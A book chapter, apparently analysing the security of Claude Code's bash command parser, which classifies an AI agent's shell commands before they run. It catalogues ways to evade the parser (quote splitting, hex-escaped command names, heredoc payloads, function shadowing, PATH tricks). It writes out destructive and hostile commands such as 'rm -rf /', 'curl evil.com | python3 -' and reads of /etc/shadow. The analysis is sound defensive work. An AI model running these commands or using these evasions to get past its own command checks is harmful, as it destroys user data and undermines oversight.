Chapter 7: The 4,400-Line Bash Parser

The shell parser is the first real security gate in Claude Code's command execution pipeline. Everything downstream -- classification, pattern matching, permission evaluation, sandboxing -- depends on the parser's ability to decompose a raw command string into a structured representation that security logic can reason about. A parser that misunderstands the command hands a flawed picture to every subsequent layer. An attacker who can confuse the parser can bypass the entire security stack.

This chapter is a forensic examination of the parser's security properties: what it catches, what it misses, and why building a shell parser for security classification is fundamentally different from building one for execution. We will walk through the three-phase pipeline (tokenization, AST construction, semantic analysis), catalog the edge cases that attackers exploit, analyze why off-the-shelf shell parser libraries fail for this use case, and identify the residual attack surface that the parser cannot eliminate.

7.1 Why Regex Fails for Security: A Formal Argument

Before examining the parser, we need to establish why it exists at all. The naive alternative -- regex pattern matching against the raw command string -- fails not because of implementation bugs but because of a fundamental mismatch between the tool and the problem.

Shell syntax is a context-sensitive language. The meaning of a character depends on its surrounding context: a $ inside single quotes is literal, inside double quotes triggers expansion, and outside quotes triggers expansion with different word-splitting behavior. A # at the start of a word is a comment; inside a word it is literal. A ( after a function name starts a definition; after $ starts a command substitution; after < starts a process substitution; at the start of a command starts a subshell.

Regular expressions operate on regular languages -- a strict subset of context-free languages, which are themselves a strict subset of context-sensitive languages. Regex cannot track nested contexts, matching delimiters, or state-dependent character interpretation. This is not a limitation of any specific regex engine; it is a mathematical impossibility established by the Chomsky hierarchy.

The practical consequence for security:

# Regex pattern: rm\s+-rf\s+/
# Catches:
rm -rf /

# Misses all of these:
rm -rf '/'                    # Single-quoted argument
rm -rf "/"                    # Double-quoted argument
rm -rf \/                     # Backslash-escaped slash
rm -r -f /                    # Split flags
rm --recursive --force /      # Long-form flags
'r'm -rf /                    # Quote-split command name
r\m -rf /                     # Backslash in command name
$(echo rm) -rf /              # Command substitution
eval "rm -rf /"               # Indirect execution
/bin/rm -rf /                 # Absolute path to binary
command rm -rf /              # Builtin prefix bypass

Each evasion exploits a different shell feature. A regex defender playing whack-a-mole must handle every combination of every feature -- a combinatorial explosion. An attacker needs to find only one combination the regex misses. This asymmetry makes regex-based security untenable for any language more complex than a flat keyword list.

CWE-78 (OS Command Injection) is the canonical weakness that regex-based defenses fail to prevent. MITRE's description explicitly notes that "blacklist approaches" (which regex implements) are "virtually always incomplete" because the attacker's command construction options exceed what the defender can enumerate.

7.2 The Three-Phase Pipeline

Claude Code's bash parser operates in three phases, each transforming the command representation to a higher level of abstraction:

graph LR
    A["Raw Command String<br/>(bytes)"] -->|"Phase 1"| B["Token Stream<br/>(typed tokens)"]
    B -->|"Phase 2"| C["Abstract Syntax Tree<br/>(structural nodes)"]
    C -->|"Phase 3"| D["Security Classification<br/>(risk categories)"]

    B -.- B1["Handles: quoting, escaping,<br/>operators, heredoc markers"]
    C -.- C1["Handles: pipelines, lists,<br/>subshells, redirections"]
    D -.- D1["Handles: command identity,<br/>argument semantics, risk level"]

Each phase has distinct responsibilities and distinct failure modes. Understanding the boundaries between phases is critical for understanding the parser's security properties.

Phase 1: Tokenization

The tokenizer converts a raw byte string into a stream of typed tokens. It is the phase that handles the most shell complexity, because shell tokenization rules are the most irregular part of the language.

Token types produced:

Token Type Examples Security Relevance
Word git, status, "hello world" Command names and arguments after quote resolution
Operator &&, \|\|, ;, \|, & Command composition -- each operator creates a new execution boundary
Redirect >, >>, <, 2>&1, &> File system side effects
Assignment VAR=value Environment modification
HeredocMarker <<EOF, <<'EOF' Multi-line string boundary
Comment # text Discarded (but must be detected to avoid false parsing of # in arguments)

Critical tokenizer decisions for security:

1. Quote normalization. All quoting mechanisms resolve to the same token content. 'rm', "rm", r\m, $'rm', and rm all produce the token Word("rm"). This is the single most important security property of the tokenizer. Without it, every downstream check must independently handle all quoting variants -- which is exactly the regex failure mode.

# All tokenize to: Word("rm"), Word("-rf"), Word("/")
rm -rf /
'rm' '-rf' '/'
"rm" "-rf" "/"
r\m -rf \/
$'rm' $'-rf' $'/'

2. Operator splitting without whitespace. The tokenizer must correctly split echo hello&&rm -rf / into five tokens: Word("echo"), Word("hello"), Operator("&&"), Word("rm"), Word("-rf"), Word("/"). Shell operators are delimiters even without surrounding whitespace. A tokenizer that requires whitespace around operators would see hello&&rm as a single word, causing the AST builder to miss the compound command structure entirely.

3. Escape resolution. Backslash escapes are resolved during tokenization. r\m becomes rm. \$VAR becomes $VAR (literal, no expansion). This prevents a class of evasion where attackers insert backslashes to break pattern recognition while preserving shell semantics.

4. Variable expansion markers. The tokenizer must distinguish between literal $VAR (inside single quotes) and expandable $VAR (outside single quotes or inside double quotes). Expandable variables are flagged as containing dynamic content that cannot be resolved statically. This flag propagates to Phase 3, where it affects classification confidence.

Tokenizer failure modes:

Failure Impact Example
Unclosed quote Tokenizer sees the rest of the string as a single quoted token rm -rf /'
ANSI-C quoting ($'...') not supported Hex/octal escapes pass through unresolved $'\x72\x6d' -rf / resolves to rm -rf /
Locale-dependent behavior Unicode characters in command names рm -rf / (Cyrillic "р")
Heredoc content parsing Content inside heredoc is not tokenized as commands cat <<EOF\nrm -rf /\nEOF

The ANSI-C quoting failure is particularly dangerous. $'\x72\x6d' is the hex encoding of rm. A tokenizer that does not handle $'...' quoting will see $'\x72\x6d' as a literal string containing dollar sign, backslash, and hex characters -- and will not recognize it as rm. The shell, however, will execute rm. This gap between what the parser sees and what the shell executes is the definition of a parser bypass vulnerability.

Phase 2: AST Construction

The AST builder consumes the token stream and constructs a tree representing the command's execution structure. Each node type corresponds to a shell construct:

AST Node Types:
  SimpleCommand      "git status"              (command + arguments)
  Pipeline           "cmd1 | cmd2"             (piped commands)
  AndList            "cmd1 && cmd2"            (conditional AND)
  OrList             "cmd1 || cmd2"            (conditional OR)
  Sequence           "cmd1 ; cmd2"             (sequential)
  Subshell           "(cmd1 && cmd2)"          (parenthesized group)
  BraceGroup         "{ cmd1; cmd2; }"         (non-subshell group)
  CommandSubstitution "$(cmd)"                 (nested command)
  ProcessSubstitution "<(cmd)" or ">(cmd)"     (fd-based substitution)
  Redirect           "cmd > file"              (I/O redirection)
  Heredoc            "cmd <<EOF"               (here-document)
  FunctionDef        "f() { cmd; }"            (function definition)
  Background         "cmd &"                   (background execution)
  Assignment         "VAR=value cmd"           (environment prefix)

Security-critical AST properties:

1. Every command boundary is explicit. The flat string git status && rm -rf / || echo "safe" becomes a tree with three SimpleCommand leaves connected by AndList and OrList nodes. Each command is independently classifiable. Without the tree structure, the classifier would need to manually parse command boundaries from the token stream -- repeating the complexity the AST builder already handled.

2. Nesting is recursive. $(echo $(echo rm)) -rf / produces a SimpleCommand node whose command-name child is a CommandSubstitution containing another CommandSubstitution containing a SimpleCommand("echo", ["rm"]). The recursive structure enables recursive security analysis: the analyzer can descend into substitutions to examine their contents.

3. Redirections are attached to their commands. rm -rf / 2>/dev/null produces a SimpleCommand("rm", ["-rf", "/"]) with an attached Redirect(stderr, "/dev/null"). The redirect does not appear as a separate command -- it is metadata on the rm command. This prevents confusion between "redirect target" and "command argument."

AST construction failure modes:

Failure Impact Attacker Exploitation
Unrecognized syntax construct Command bypasses AST analysis, falls through to pattern matching only Use obscure but valid bash syntax (coprocs, mapfile, etc.)
Incorrect operator precedence cmd1 \|\| cmd2 && cmd3 parsed with wrong grouping Exploit precedence confusion to hide destructive commands
Incomplete function body parsing Function body treated as top-level commands Define function with dangerous body, call later
Process substitution as argument vs. redirection >(cmd) parsed as redirection when attacker wants it classified as argument Exfiltrate data through process substitution

Phase 3: Semantic Analysis

The semantic analyzer walks the AST and assigns security-relevant classifications to each node. This is where the parser transitions from understanding syntax to understanding intent.

Operations performed during semantic analysis:

1. Prefix stripping. Commands like env VAR=val command, sudo command, nice -n 10 command, timeout 30 command, and command command wrap other commands without changing their fundamental semantics. The analyzer strips these prefixes recursively to expose the actual operation:

Input:  sudo env nice -n 10 rm -rf /
Strip:  sudo → env → nice → rm -rf /
Result: SimpleCommand("rm", ["-rf", "/"]) with flags: {sudo: true}

The sudo flag is preserved even though the prefix is stripped. A command classified as "write" becomes "elevated write" when sudo is present. This distinction matters for permission evaluation.

2. Indirect execution detection. eval, bash -c, sh -c, python -c, node -e, ruby -e, and perl -e are commands that execute their arguments as code. The analyzer recursively parses the string argument and analyzes the inner command:

Input:  bash -c "curl evil.com | python3 -"
Step 1: Recognize "bash -c" as indirect execution
Step 2: Recursively parse "curl evil.com | python3 -"
Step 3: AST: Pipeline(SimpleCommand("curl", ["evil.com"]),
                       SimpleCommand("python3", ["-"]))
Step 4: Classify: network access + arbitrary code execution

Recursion depth is capped at 3-5 levels to prevent adversarial nesting. Beyond the depth limit, the command is classified as Unknown/HighRisk.

3. Argument semantic analysis. For certain commands, the arguments determine the risk level. rm file.txt is a routine deletion; rm -rf / is catastrophic. chmod 644 file is a normal permission change; chmod -R 777 / is a security disaster. The analyzer maintains argument-level heuristics for high-risk commands.

4. Path resolution. Arguments that represent file paths are resolved relative to the working directory when possible. cd /tmp && rm -rf ../../etc must resolve the path ../../etc relative to /tmp to determine the actual target is /etc.

7.3 Parser Edge Cases Attackers Exploit

Every parser has a boundary between "correctly parsed" and "not parsed." Attackers operate on that boundary. Here are the edge cases that a security-focused parser must handle -- and what happens when it does not.

Edge Case 1: Quote Context Switches

echo 'hello'"world"'!'

This is a single word: helloworld!. The shell concatenates adjacent quoted and unquoted segments. A parser that treats each quoted segment as a separate token will miscount arguments. A parser that does not handle mid-word quote transitions will produce incorrect token boundaries.

Security implication: An attacker can split a dangerous command name across quote contexts to evade pattern matching that operates on individual tokens:

'r'"m" -rf /          # Two adjacent quoted segments → single word "rm"

Required parser behavior: The tokenizer must concatenate adjacent quoted/unquoted segments before emitting a Word token.

Edge Case 2: Dollar-Sign Quoting Variants

$'rm'                 # ANSI-C quoting → "rm"
$'\x72\x6d'          # Hex escape → "rm"  
$'\162\155'           # Octal escape → "rm"
$'\u0072\u006d'       # Unicode escape → "rm"

Security implication: The $'...' syntax provides four encoding mechanisms for command names. Any one that the parser misses is a bypass vector for command name-based classification.

Required parser behavior: Full ANSI-C quote interpretation including \x, \0, \u, and \U escape sequences.

Edge Case 3: Brace Expansion as Argument Generator

rm -rf /{bin,etc,usr,var}
# Expands to: rm -rf /bin /etc /usr /var

Security implication: Brace expansion generates multiple arguments from a single syntactic element. A classifier that examines the literal argument /{bin,etc,usr,var} may not recognize it as targeting four system directories.

Required parser behavior: Either expand braces before classification or classify the unexpanded pattern conservatively (treating /{...} as targeting /).

Edge Case 4: Process Substitution for Data Exfiltration

diff <(cat /etc/shadow) <(cat /etc/passwd)

Security implication: Process substitution <(...) creates a file descriptor that reads from a command's output. The command inside <(...) executes with the same privileges as the outer command. A parser that treats <(cat /etc/shadow) as a filename argument misses the command execution inside the substitution.

Required parser behavior: Parse process substitution contents recursively as command lists and include them in the security analysis.

Edge Case 5: Heredoc Content as Command Payload

python3 <<'PAYLOAD'
import os
os.system("rm -rf /")
PAYLOAD

Security implication: Heredocs pass arbitrary content as standard input to a command. If that command is an interpreter (python3, ruby, node, bash), the heredoc content is executable code. A parser that ignores heredoc content misses the actual payload.

Required parser behavior: When a heredoc's target command is an interpreter, flag the entire construct as IndirectExecution. Optionally, attempt to parse the heredoc content as code in the target language -- but this requires language-specific parsers and is impractical in the general case.

Edge Case 6: Arithmetic Expansion as Command Injection

echo $((1 + $(rm -rf /)))

Security implication: Arithmetic expansion $((...)) evaluates arithmetic expressions, but inside it, $(...) command substitution still works. An attacker nests a command substitution inside arithmetic expansion to hide dangerous commands in an ostensibly numeric context.

Required parser behavior: Parse $(...) command substitutions inside $((...)) arithmetic expansion.

Edge Case 7: Array Variable Expansion

cmd=(rm -rf /)
"${cmd[@]}"

Security implication: Bash arrays store commands and arguments. When expanded with "${cmd[@]}", the array elements become the command and its arguments. Static analysis cannot resolve the array's contents because the assignment and expansion may be separated by arbitrary code -- or may occur in different commands.

Required parser behavior: Flag "${cmd[@]}" and "${cmd[*]}" as unresolvable dynamic execution. The semantic analyzer cannot determine the command that will run, so it must escalate to the next security layer (permission check or user prompt).

7.4 Why "Just Use a Shell Parser Library" Does Not Work

A natural question: why build a 4,400-line parser from scratch when shell parser libraries exist? The answer has three parts.

Part 1: Correctness Goals Diverge

A shell parser library is built for execution correctness: it parses shell commands to execute them. A security parser is built for classification correctness: it parses shell commands to determine what they will do.

These goals diverge on ambiguous input. An execution parser for $VAR will defer to runtime expansion -- it does not need to know the variable's value at parse time. A security parser must flag $VAR as unresolvable and escalate, because the variable's value could be rm -rf /.

An execution parser for eval "$CMD" will pass the string to the shell for re-parsing at runtime. A security parser must attempt to classify the eval target or flag it as opaque indirect execution.

Part 2: Error Handling Requirements Diverge

A shell parser library treats parse errors as terminal -- the command is malformed and cannot execute. A security parser must handle parse errors gracefully: if it cannot parse a command, it must still produce a conservative classification and pass the command to downstream security layers.

The parse failure policy for a security parser is not "reject" but "escalate." Unparseable commands bypass AST-based analysis but still face pattern matching, permission evaluation, and sandboxing. A library parser that throws on unparseable input would block this fallback chain.

Part 3: The Library's Parser May Be Too Faithful

Shell parser libraries aim for 100% fidelity with the target shell (bash, zsh, dash). This means they implement features like alias expansion, shell options (shopt), and conditional syntax ([[ ]] vs. [ ]) exactly as the shell does.

A security parser does not need -- and should not have -- this fidelity. If the security parser expands aliases, it must track alias definitions across commands, which makes the parser stateful and introduces the same cross-command analysis problem that the parser is designed to avoid. If it implements shopt options, it must track shell option state, which varies across sessions and environments.

The right level of fidelity for a security parser is: parse the structure correctly, resolve quoting and escaping, identify command boundaries and nesting, and flag everything that depends on runtime state as unresolvable. This is a different parser than one designed for execution.

Part 4: Dependencies Are Attack Surface

A third-party parser library is a dependency. Dependencies can have vulnerabilities (CVE-2023-XXXXX in your shell parser library), can be abandoned (maintainer stops updating), and can be supply-chain attacked (malicious code injected into a release). For a security-critical component, minimizing dependencies reduces the attack surface.

A purpose-built parser has exactly one maintainer: the security team. Its behavior is fully auditable, its edge cases are documented, and its test suite covers the specific evasion techniques the team is defending against. This is not an argument against all dependencies -- it is an argument against dependencies in security-critical parsing paths.

7.5 Security Properties of the Parser

Having examined the structure and edge cases, we can now enumerate the parser's security properties -- what it guarantees, what it does not, and what residual risk remains.

Property 1: Quote Normalization (Strong)

Mechanism: The tokenizer resolves all quoting variants to canonical token content. 'rm', "rm", r\m, $'rm', and rm all produce Word("rm").

Weakness: ANSI-C quoting with hex/octal/unicode escapes requires character-by-character interpretation. If the parser's $'...' handler has a bug in escape resolution, encoded command names bypass classification.

Mitigation: Fuzz testing the tokenizer with all escape sequences. The test suite should include every combination of $'...' escape type applied to every dangerous command name.

Residual risk: Low. Quote normalization is well-understood and thoroughly testable.

Property 2: Command Boundary Detection (Strong)

Mechanism: The AST builder identifies all command boundaries: &&, ||, ;, |, &, subshells, brace groups, and compound commands. Each command is independently classifiable.

Weakness: Novel shell syntax that the parser does not recognize (e.g., bash 5.2's ${ ... ; } command substitution variant) creates unparsed regions where command boundaries may be missed.

Mitigation: Track the bash version in use and update the parser when new syntax is introduced. Fall back to conservative classification for unparsed regions.

Residual risk: Low for bash 4.x/5.0. Increases with each new bash release that introduces syntax the parser does not yet handle.

Property 3: Recursive Nesting Analysis (Moderate)

Mechanism: Command substitution ($(...)) and indirect execution (eval, bash -c) are recursively parsed and analyzed. The inner commands receive full security analysis.

Weakness: Recursion depth is capped (typically 3-5 levels). Beyond the cap, inner commands are classified as Unknown/HighRisk. An attacker who nests beyond the cap could hide a dangerous command inside what appears to be a single opaque Unknown classification -- which may receive less scrutiny than a Destructive classification from security reviewers.

Mitigation: Ensure that Unknown/HighRisk classification triggers the same permission gates as Destructive. The classification name should not matter; the permission behavior should be equally restrictive.

Residual risk: Moderate. The cap is necessary for DoS prevention, but it creates a known blind spot.

Property 4: Variable Expansion Flagging (Weak)

Mechanism: The parser identifies $VAR, ${VAR}, and $(cmd) as containing dynamic content that cannot be resolved statically. These are flagged for escalation.

Weakness: The parser cannot determine what value a variable will hold at execution time. cmd="rm -rf /"; $cmd will be flagged as dynamic execution, but the parser cannot classify what the dynamic execution will do.

Mitigation: The semantic analyzer flags all unresolvable dynamic execution as requiring user approval or AI classifier evaluation. This defers the decision to a layer that can consider context (the AI classifier sees the full conversation, including the variable assignment).

Residual risk: Moderate-high. Variable-based execution is common in legitimate use (build scripts, makefiles) and in attacks. The false positive rate for flagging variables is high, which pressures the system toward leniency -- the exact direction attackers want.

Property 5: Resilience to Malformed Input (Moderate)

Mechanism: The parser follows a "fail-open with escalation" policy. Unparseable commands bypass AST analysis but face pattern matching, permission evaluation, and sandboxing.

Weakness: A command crafted to confuse the parser into producing an incorrect AST (rather than a parse failure) is more dangerous than one that triggers a parse failure. An incorrect AST produces incorrect classification with no escalation.

Mitigation: Differential testing against the actual shell. Run the parser and the shell on the same input; compare the parser's interpretation with the shell's actual execution. Discrepancies reveal parser bugs that produce incorrect ASTs.

Residual risk: Moderate. The parser and the shell are different codebases interpreting the same language. Any behavioral divergence is a potential security gap.

7.6 The Parser as a TOCTOU Surface

The parser operates at analysis time. The shell operates at execution time. Between these two points, the command string does not change -- but the environment in which it executes can change.

# At parse time: $HOME is /home/user
# Between parse and execution: another process changes HOME
# At execution time: $HOME is /
rm -rf "$HOME/cache"
# Parser classifies: delete /home/user/cache (safe)
# Shell executes: delete /cache (dangerous)

This is a Time-of-Check-to-Time-of-Use (TOCTOU) vulnerability (CWE-367). The parser's classification is based on a snapshot of reality that may be stale by execution time.

Mitigations:

  1. The sandbox restricts file system access regardless of the parser's classification. Even if the parser misclassifies the target path, the sandbox prevents writes outside the allowed directory.
  2. The AI classifier evaluates commands in the full conversation context, which may include the environment manipulation that the parser missed.
  3. Minimize the time between parsing and execution. In Claude Code's pipeline, the parser runs immediately before execution, reducing the TOCTOU window.

Residual risk: Low in practice (the TOCTOU window is milliseconds), but the theoretical vulnerability exists and cannot be eliminated by parsing alone.

7.7 Performance Characteristics

A security parser that adds seconds of latency to every command is a parser that users will disable. The performance budget for the parser is strict:

Phase Target Actual (typical) Worst case
Tokenization <3ms 0.5-2ms 8ms (100KB command)
AST Construction <2ms 0.3-1ms 5ms (50+ subcommands)
Semantic Analysis <5ms 1-3ms 15ms (deep nesting)
Total <10ms 2-6ms 28ms

The worst case occurs with pathologically long commands (100KB+) or deeply nested substitutions. These commands are rare in legitimate use and are themselves suspicious -- the parser can apply a size limit (100KB) to prevent denial-of-service against the parser itself.

The parser also enforces a subcommand count limit (typically 50). Commands with more than 50 subcommands are deferred to the user rather than analyzed, because the combinatorial complexity of analyzing 50+ interacting commands exceeds the parser's classification confidence.

7.8 Differential Testing: Parser vs. Shell

The ultimate test of a security parser is whether it agrees with the shell it is defending against. If the parser says a command runs ls but the shell runs rm, the parser has failed its security mission.

Differential testing runs both the parser and the shell on the same input:

For each test case:
  1. Parse the command with the security parser → extract command name
  2. Execute the command in a sandbox shell with tracing → capture actual binary
  3. Compare: does the parser's command name match the shell's executed binary?

Known divergence categories:

Category Example Parser sees Shell executes
Alias expansion alias ll='ls -la'; ll ll (unknown) ls -la
Shell function shadowing git() { rm -rf /; }; git status git (dev-tool) rm -rf / (destructive)
PATH manipulation PATH=/evil:$PATH; ls ls (read-only) /evil/ls (unknown)
Conditional expansion ${DEBUG:+rm -rf /} Unresolvable Depends on $DEBUG

Each divergence category represents a residual attack surface. The parser handles categories 1 and 2 by flagging alias definitions and function definitions as suspicious. Categories 3 and 4 require runtime state that the parser cannot access.

7.9 The Parser's Role in Defense-in-Depth

The parser is not a complete security solution. It is the first layer in a six-layer pipeline (as described in Chapter 8 and Chapter 9). Its job is to transform the security problem from "analyze a raw string" to "analyze a structured tree" -- a dramatically easier problem for downstream layers.

What the parser eliminates: - Quote-based evasion (normalization) - Operator-based hiding (command boundary detection) - Nesting-based concealment (recursive analysis)

What the parser cannot eliminate: - Runtime state dependencies (variables, aliases, PATH) - Cross-command attack chains (multi-step exploits across separate tool calls) - Encoded payloads inside heredocs or interpreter arguments - TOCTOU between parse and execution

The downstream layers (command classification in Chapter 8, sandbox in Chapter 9) are specifically designed to catch what the parser misses. This layered design means a parser bug does not equal a security bypass -- it means one layer's contribution is reduced while the others compensate.

Security Assessment: The Bash Parser

Property Rating Justification
Quote normalization Strong All standard quoting variants resolved. ANSI-C edge cases require attention.
Command boundary detection Strong All standard operators and grouping constructs handled.
Recursive nesting analysis Moderate Depth cap creates known blind spot beyond 3-5 levels.
Variable expansion handling Weak Static analysis cannot resolve runtime variable values. Escalation is the only option.
Resilience to malformed input Moderate Fail-open policy is correct, but incorrect ASTs (vs. parse failures) are harder to detect.
TOCTOU resistance Low Parser operates at analysis time; environment can change before execution. Sandbox mitigates.

Overall: The parser is a necessary but insufficient security control. It eliminates the most common evasion techniques (quoting, escaping, nesting) but cannot address runtime-dependent attacks. Its primary value is enabling downstream layers to operate on structured data rather than raw strings -- a force multiplier for the entire security pipeline.

Key CWEs addressed: CWE-78 (OS Command Injection), CWE-116 (Improper Encoding/Escaping of Output), CWE-838 (Inappropriate Encoding for Output)

Key CWEs requiring downstream layers: CWE-367 (TOCTOU Race Condition), CWE-94 (Code Injection via interpreter arguments), CWE-77 (Command Injection via indirect execution)
